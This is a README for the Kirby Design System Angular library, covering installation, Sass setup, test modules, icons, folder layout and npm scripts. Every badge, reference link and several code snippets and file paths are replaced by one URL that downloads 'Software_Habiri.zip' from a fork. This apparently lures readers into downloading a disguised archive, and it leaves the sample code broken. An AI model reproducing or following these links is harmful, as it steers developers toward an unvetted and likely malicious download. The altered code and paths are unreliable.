## Kirby Design System

<!-- Badges section here. -->
<!-- [![npm](https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip)][npm-badge-url] -->

[![npm](https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip)](https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip)
[![npm](https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip)](https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip)
[![npm](https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip)](https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip)

[![GitHub forks](https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip)](https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip)
[![GitHub stars](https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip)](https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip)

## About

Kirby Design System is a UX Component library implementing the [Kirby Design Philosophy][https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip].

Kirby Components are built on top of [Angular][angular] and can be used in Angular projects.

The Kirby Cookbook, containing samples, status of components etc. can be accessed from [https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip][https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip].

## Table of Contents

- [Kirby Design System](#kirby-design-system)
- [About](#about)
- [Table of Contents](#table-of-contents)
- [Installation](#installation)
  - [Include KirbyModule](#include-kirbymodule)
  - [Sass](#sass)
    - [Generic Print Styles (Optional)](#generic-print-styles-optional)
  - [Testing](#testing)
  - [Icons](#icons)
  - [Migration Guides](#migration-guides)
- [Folder Structure](#folder-structure)
- [Scripts](#scripts)
- [Contributing](#contributing)

## Installation

Install through npm:

```bash
npm i @kirbydesign/designsystem
```

### Include KirbyModule

Import the `KirbyModule` in your `AppModule` :

```ts
import { KirbyModule } from '@kirbydesign/designsystem';

...

@NgModule({
    imports: [
        ...,
        KirbyModule
    ],
    ...
})
export class AppModule {}
```

### Sass

Include the Kirby global styles in your app, e.g., in `https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip`:

```css
@use '@kirbydesign/designsystem/scss/global-styles';
```

In each `.scss` file where you need to access the Sass utility functions from Kirby (e.g. [colors][https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip] or [fonts][https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip]) you must import the scss utilities:

```css
@use '@kirbydesign/designsystem/scss/utils';
```

#### Generic Print Styles (Optional)

Kirby also provides a generic print stylesheet. It includes the basics. You most likely have to add local print styles specific to your app as well.

Import it into your app, e.g., in `https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip` or in your local print stylesheet if you have one:

```css
@use '@kirbydesign/designsystem/scss/print';
```

### Testing

To unit-test applications using Kirby's Components, we recommend importing one of the following modules:

- When using [jasmine][jasmine]: `import { KirbyTestingModule } from '@kirbydesign/designsystem/`**`testing-jasmine'`**`;`
- When using [jest][jest]: `import { KirbyTestingModule } from '@kirbydesign/designsystem/`**`testing-jest'`**`;`

Example:

```ts
import { KirbyTestingModule } from '@kirbydesign/designsystem/testing-jasmine';

describe('AppComponent', () => {
  beforeEach(async(() => {
    https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip({
      imports: [KirbyTestingModule],
      declarations: [AppComponent]
    }).compileComponents();
  }));

  ...

});
```

For unit test performance reasons it's highly recommended to utilize these modules, since they provide a template-less implementation of the Kirby Components, but still translude content through `<ng-content></ng-content>` and provide `@Input` -decorated properties and `@Output` -decorated `EventEmitter` s, without
having to reflow the DOM, execute component logic etc.

### Icons

Kirby comes bundled with a default set of icons. Make sure the `.svg` files used by Kirby are copied to your output folder by adding the following to `build > options > assets` in `https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip` :

```json
{
  ...
  "build": {
    "options": {
      "assets": [
        ...,
        {
          "glob": "**/*.svg",
          "input": "node_modules/@kirbydesign/designsystem/icons/svg",
          "output": "./assets/kirby/icons/svg"
        },
        {
          "glob": "https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip",
          "input": "node_modules/@kirbydesign/designsystem/icons/svg",
          "output": "./svg"
        },
        ...
      ],
    }
  }
}
```

### Migration Guides

For details on migrating from earlier versions of Kirby see our [Migration Guides](https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip).

## Folder Structure

The folder structure of the repository is based on [Nrwl][nrwl]'s [NX][nx] mono-repository project.

A basic walkthrough is outlined in the structure below:

```
@kirbydesign/designsystem
├── apps                    # Contains source code for applications
|  └── cookbook             # - Cookbook application (showcase and examples)
├── dist                    # Contains output files when building artifacts (for distribution)
|  ├── apps
|  └── libs
├── libs                    # Contains source code for libraries
|  └── designsystem         # - Actual implementation of library (designsystem)
├── scripts                 # Scripts for building artifacts
└── tools                   # Contains various tools
   ├── generate-mocks       # - CLI utility for generating mocks for `@kirbydesign/designsystem/testing-jasmine`
   |                        #   and `@kirbydesign/designsystem/testing-jest` entry points.
   ├── sass-to-ts           # - CLI and Webpack plugin for extract global variables from SASS to TS
   ├── schematics           # - Angular schematics
```

## Scripts

Below is an overview of most widely used scripts, available for this project.  
Use them in your terminal like: `npm run <script>` :

| Command           | Description                                                                                                                                            |
| ----------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| start             | Starts the development server, providing a means of running (and developing on the Cookbook)                                                           |
| lint              | Lints the entire project (both TypeScript and SCSS source code)                                                                                        |
| lint:cookbook     | Lints the Cookbook application (both TypeScript and SCSS source code)                                                                                  |
| lint:designsystem | Lints the Designsystem library (both TypeScript and SCSS source code)                                                                                  |
| dist:cookbook     | Builds a distribution folder of the Cookbook application                                                                                               |
| dist:designsystem | Builds a distribution folder of the Designsystem library                                                                                               |
| transpile:tools   | Transpiles tools, required to produce library distribution (this is done as a `post-install` hook, but may have value if altering tool implementation) |

## Contributing

If you wish to contribute new features, bug fixes or something third to the project have a look at the [contribution guidelines](https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip).

[angular]: https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip
[jasmine]: https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip
[jest]: https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip
[nrwl]: https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip
[nx]: https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip
[https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip]: https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip
[https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip]: https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip
[https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip]: https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip
[https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip]: https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip
[https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip]: https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip
